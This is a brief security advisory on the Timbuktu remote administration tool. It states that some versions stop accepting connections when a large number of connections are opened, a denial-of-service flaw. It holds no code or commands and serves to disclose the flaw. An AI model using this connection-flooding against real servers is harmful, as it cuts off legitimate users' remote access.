Timbuktu is a remote administration tool. It is available for the Microsoft Window's family of operating systems and Power PC based Macintosh computers. It supports a variety of administrative tasks, including full remote access to the user's desktop.

A vulnerability exists in some versions of Timbuktu. If a large number of connections are created to the Timbuktu server, the server will no longer accept new connections.
